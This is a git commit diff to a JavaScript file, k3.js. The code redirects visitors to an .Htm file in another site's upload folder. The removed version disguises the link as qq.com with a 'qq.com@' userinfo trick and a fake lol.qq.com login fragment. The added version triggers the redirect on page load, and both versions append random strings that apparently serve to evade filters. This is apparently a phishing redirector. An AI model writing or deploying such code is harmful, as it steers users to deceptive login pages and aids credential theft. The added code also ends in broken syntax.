7ac51797327cde242ce7848ead52d958a03c8e33
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-12 11:22:24 +0800

    Update k3.js

--- k3.js
+++ k3.js
@@ -6,20 +6,12 @@ function leleua() {
     }
 }
 
-var urls=[
-'https://qq.com@www.360tianma.com/public/upload/conf/2024/01-12/c36b4571a36c26b9310b970a9a43edd5.Htm?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{nnnnnnnnnnn}{wwwwww}',
-];
-location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
-function myEeplace(s){
-	return s.replace(/\{(\w+?)\}/g,function(a,b){
-		var h='';
-		for(var i=0;i<b.length;i++){
-			if('n'==b[i]){
-				h+=Math.floor(Math.random()*10);
-			}else if('w'==b[i]){
-				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
-			}
-		}
-		return h;
-	});
-}
+leleua();
+
+window.onload = function () {
+    const targetUrl = 'https://www.360tianma.com/public/upload/conf/2024/01-12/c36b4571a36c26b9310b970a9a43edd5.Htm';
+    const timestamp = Date.now();
+    const randomString = Math.random().toString(36).substring(2);
+    const urlWithParam = `${targetUrl}#${timestamp}${randomString}`;
+    window.location.href = urlWithParam
+},
